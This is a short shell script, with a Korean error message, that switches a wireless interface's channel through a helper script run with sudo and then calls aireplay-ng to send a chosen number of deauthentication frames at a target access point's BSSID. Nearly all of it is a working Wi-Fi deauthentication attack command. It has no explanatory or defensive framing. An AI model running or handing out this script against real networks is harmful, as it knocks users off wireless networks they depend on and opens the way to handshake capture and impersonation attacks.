#!/bin/sh

if [ $# = 0 ]
then
	echo "무선랜 device정보가 누락되었습니다"
	return
fi
 

	echo "./run_change_channel.sh $4 $3"
	sudo sh ./run_change_channel.sh $4 $3 

	echo "aireplay-ng --deauth-rc 2 --deauth $1 -a $2 $4"
	/usr/sbin/aireplay-ng --deauth-rc 2 --deauth $1 -a $2 $4 -T 1
